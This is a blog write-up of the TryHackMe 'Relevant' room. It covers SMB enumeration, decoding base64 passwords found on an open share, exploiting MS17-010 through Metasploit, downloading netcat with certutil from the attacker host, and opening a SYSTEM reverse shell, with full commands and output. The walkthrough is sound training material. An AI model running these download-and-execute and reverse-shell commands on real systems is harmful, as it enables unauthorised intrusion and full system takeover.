---
layout: post
title:  "Relevant Walkthrough"
date:   2021-08-17 12:44:14 -0400
categories: boxwriteup
---


Relevant is a free Try Hack Me room that tried to emulate a black box penetration test. Below is a walk through of my way of exploiting it and getting system level privileges. There are more than 1 way to do this and below I will put an alternative method found.

* * *

# Nmap Scan

```bash
└─$ sudo nmap -sC -sV 10.10.43.14  -o small.nmap      
[sudo] password for raindayzz: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 13:11 EDT
Nmap scan report for 10.10.43.14
Host is up (0.16s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-15T17:13:04+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-08-14T17:09:05
|_Not valid after:  2022-02-13T17:09:05
|_ssl-date: 2021-08-15T17:13:41+00:00; +2s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m50s, median: 1s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-15T10:13:02-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T17:13:04
|_  start_date: 2021-08-15T17:09:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

* * *

# Manual Enumeration

### Port 80 HTTP

We can see this has some more common Windows ports open. Let's check out port 80 (HTTP) as this is normally a large attack vector.

![Pasted image 20210817114511.png](:/images/defaultiis.png)

This looks to be a default IIS server. Nothing special, I will run some directory busting enumeration in the background for the time being using gobuster.

### Port 445

SMB is a giant attack vector and has the tendency to be out-dated or mis-configured. Let's check it out with SMBClient and see what is accessible.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ smbclient -L //10.10.102.225                         
Enter WORKGROUP\raindayzz's password: 

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.102.225 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I see that there is a Share with the name of "nt4wrksv". Let's see if we can connect with anonymous credentials.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ smbclient //10.10.102.225/nt4wrksv 
Enter WORKGROUP\raindayzz's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

        7735807 blocks of size 4096. 4949312 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

We were able to connect and grab a .TXT file names passwords, Looks pretty juicy.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ cat passwords.txt  
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                                                                                                                                                                              
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ echo -n "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                                                                 
Bob - !P@$$W0rD!123                                                                                                                                                                                                                                              
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ echo -n "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

As soon as I concatenated the file, I recognized it was base64 encrypted and contained two potential users; Bill and Bob.

We now have passwords but no direct access channels like SSH, FTP, Admin pages. Let's do some reconnaissance on the Host OS.

### Windows & SMB Version

A quick google search from the initial nmap gave some awesome results.

iamge here

At first glance, it seems to be vulnerable to EternalBlue with is an exploit developed by the NSA that targets SMB. This exploit was leaked from the NSA and one of the more infamous vulnerabilities because of the ransomware adoption. Nonetheless, let's see if our host is vulnerable using nmap scripting engine.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo nmap -v -p 135,139,445 --script=smb-vuln* 10.10.102.225 -o Vuln.nmap                                                                                                                                                             1 ⨯
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 11:49 EDT
NSE: Loaded 11 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Initiating Ping Scan at 11:49
Scanning 10.10.102.225 [4 ports]
Completed Ping Scan at 11:49, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.12s elapsed
Initiating SYN Stealth Scan at 11:49
Scanning 10.10.102.225 [3 ports]
Discovered open port 139/tcp on 10.10.102.225
Discovered open port 135/tcp on 10.10.102.225
Discovered open port 445/tcp on 10.10.102.225
Completed SYN Stealth Scan at 11:49, 0.12s elapsed (3 total ports)
NSE: Script scanning 10.10.102.225.
Initiating NSE at 11:49
Completed NSE at 11:49, 15.38s elapsed
Nmap scan report for 10.10.102.225
Host is up (0.13s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

Boom! It is vulnerable to MS17-010. Metasploit might have some goodies for us.

* * *

# Exploit Time

### Metasploit

Metasploit is a Ruby-based penetration testing platform containing thousands of tools, exploits, scanners, and more. Let's fire it up!

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo msfconsole                                                           
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.0.33-dev                          ]
+ -- --=[ 2102 exploits - 1134 auxiliary - 357 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Use the resource command to run 
commands from a file

msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > 

```

We will use the "auxiliary/admin/smb/ms17\_010\_command" module for now to test our exploit.

Selecting the exploit we have a few options that need to be filled in.

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > options

Module options (auxiliary/admin/smb/ms17_010_command):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   COMMAND               net group "Domain Admins" /domain                               yes       The command you want to execute on the remote host
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
   SMBUser                                                                               no        The username to authenticate as
   THREADS               1                                                               yes       The number of concurrent threads (max one per host)
   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory
```

Let's start with trying to execute a ping command on the target to ping our host. I will start a TcpDump on my VPN tunnel interface with an ICMP filter only displaying ICMP(Ping traffic).

```bash
──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo tcpdump -i tun0 'icmp'
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Here are the final options sending a ping command to ping our local machine 3 times.

```bash
Module options (auxiliary/admin/smb/ms17_010_command):

   Name                  Current Setting                Required  Description
   ----                  ---------------                --------  -----------
   COMMAND               ping -n 3 10.9.11.106          yes       The command you want to execute on the remote host
   DBGTRACE              false                          yes       Show extra debug trace info
   LEAKATTEMPTS          99                             yes       How many times to try to leak transaction
   NAMEDPIPE                                            no        A named pipe that can be connected to (leave blank
                                                                   for auto)
   NAMED_PIPES           /usr/share/metasploit-framewo  yes       List of named pipes to check
                         rk/data/wordlists/named_pipes
                         .txt
   RHOSTS                10.10.102.225                  yes       The target host(s), range CIDR identifier, or host
                                                                  s file with syntax 'file:<path>'
   RPORT                 445                            yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                  no        Service description to to be used on target for pr
                                                                  etty listing
   SERVICE_DISPLAY_NAME                                 no        The service display name
   SERVICE_NAME                                         no        The service name
   SMBDomain             .                              no        The Windows domain to use for authentication
   SMBPass               Juw4nnaM4n420696969!$$$        no        The password for the specified username
   SMBSHARE              C$                             yes       The name of a writeable share on the server
   SMBUser               bill                           no        The username to authenticate as
   THREADS               1                              yes       The number of concurrent threads (max one per host
                                                                  )
   WINPATH               WINDOWS                        yes       The name of the remote Windows directory
```

My favorite time - Let's run the exploit....

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 10.10.102.225:445     - Authenticating to 10.10.102.225 as user 'bill'...
[*] 10.10.102.225:445     - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 10.10.102.225:445     - Built a write-what-where primitive...
[+] 10.10.102.225:445     - Overwrite complete... SYSTEM session obtained!
[+] 10.10.102.225:445     - Service start timed out, OK if running a command or non-service executable...
[-] 10.10.102.225:445     - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
[-] 10.10.102.225:445     - Command seems to still be executing. Try increasing RETRY and DELAY
[*] 10.10.102.225:445     - Getting the command output...
[*] 10.10.102.225:445     - Command finished with no output
[*] 10.10.102.225:445     - Executing cleanup...
[+] 10.10.102.225:445     - Cleanup was successful
[+] 10.10.102.225:445     - Command completed successfully!
[*] 10.10.102.225:445     - Output for "ping -n 3 10.9.11.106":



[*] 10.10.102.225:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/ms17_010_command) > 
```

Checking our tcpdump, we get the ping commands!

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo tcpdump -i tun0 'icmp'
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:00:49.043804 IP 10.10.102.225 > 10.9.11.106: ICMP echo request, id 1, seq 4, length 40
12:00:49.043815 IP 10.9.11.106 > 10.10.102.225: ICMP echo reply, id 1, seq 4, length 40
12:00:50.194631 IP 10.10.102.225 > 10.9.11.106: ICMP echo request, id 1, seq 5, length 40
12:00:50.194643 IP 10.9.11.106 > 10.10.102.225: ICMP echo reply, id 1, seq 5, length 40
12:00:51.552937 IP 10.10.102.225 > 10.9.11.106: ICMP echo request, id 1, seq 6, length 40
12:00:51.552950 IP 10.9.11.106 > 10.10.102.225: ICMP echo reply, id 1, seq 6, length 40
```

### Interactive Shell Time

I am going to try to get a shell on the system using a common binary called Netcat. Netcat is a swiss army knife tool that uses TCP/UDP connections to do a multitude of things including a shell.

This is two parts.

1.  Downloading the binary to the Machine - We will do this by starting a local HTTP server on my attacker machine and serving the binary. We will then use Certutil.exe to download the binary and place it on the target system.
2.  We will use the new binary on the system to spawn a reverse shell. Start a listener on our attacker machine and send a command to the target to spawn a shell back to us.

Let's do this.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ cp /usr/share/windows-binaries/nc64.exe .
                                                                                                                     
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ file nc64.exe              
nc64.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows

┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Now that we have the binary and serving it to HTTP. Let's send the command to download it.

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 10.10.102.225:445     - Authenticating to 10.10.102.225 as user 'bill'...
[*] 10.10.102.225:445     - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 10.10.102.225:445     - Built a write-what-where primitive...
[+] 10.10.102.225:445     - Overwrite complete... SYSTEM session obtained!
[+] 10.10.102.225:445     - Service start timed out, OK if running a command or non-service executable...
[-] 10.10.102.225:445     - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
[-] 10.10.102.225:445     - Command seems to still be executing. Try increasing RETRY and DELAY
[*] 10.10.102.225:445     - Getting the command output...
[*] 10.10.102.225:445     - Command finished with no output
[*] 10.10.102.225:445     - Executing cleanup...
[+] 10.10.102.225:445     - Cleanup was successful
[+] 10.10.102.225:445     - Command completed successfully!
[*] 10.10.102.225:445     - Output for "certutil.exe -f -urlcache http://10.9.11.106/nc64.exe C:\nc.exe":



[*] 10.10.102.225:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/ms17_010_command) > 
```

Boom we can view it downloaded the binary from our machine.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.102.225 - - [17/Aug/2021 12:05:50] "GET /nc64.exe HTTP/1.1" 200 -
10.10.102.225 - - [17/Aug/2021 12:05:58] "GET /nc64.exe HTTP/1.1" 200 -
```

Now we need to spawn a shell.

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 10.10.102.225:445     - Authenticating to 10.10.102.225 as user 'bill'...
[*] 10.10.102.225:445     - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 10.10.102.225:445     - Built a write-what-where primitive...
[+] 10.10.102.225:445     - Overwrite complete... SYSTEM session obtained!
[+] 10.10.102.225:445     - Service start timed out, OK if running a command or non-service executable...
[-] 10.10.102.225:445     - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
[-] 10.10.102.225:445     - Command seems to still be executing. Try increasing RETRY and DELAY
[*] 10.10.102.225:445     - Getting the command output...
[*] 10.10.102.225:445     - Command finished with no output
[*] 10.10.102.225:445     - Executing cleanup...
[+] 10.10.102.225:445     - Cleanup was successful
[+] 10.10.102.225:445     - Command completed successfully!
[*] 10.10.102.225:445     - Output for "C:\nc.exe 10.9.11.106 135 -e cmd.exe":



[*] 10.10.102.225:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/ms17_010_command) >

```

Boom we got it!

```windows
┌──(raindayzz㉿redfish)-[~/TryHackMe/Relevant]
└─$ sudo nc -lnvp 135                                                       1 ⨯
listening on [any] 135 ...
connect to [10.9.11.106] from (UNKNOWN) [10.10.102.225] 49872
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::f5be:a00e:dfd9:f169%4
   IPv4 Address. . . . . . . . . . . : 10.10.102.225
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter Local Area Connection* 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:8aa:1a8e:f5f5:991e
   Link-local IPv6 Address . . . . . : fe80::8aa:1a8e:f5f5:991e%3
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal

C:\Windows\system32>
```

We now own the system and able to view all of the flags on the system.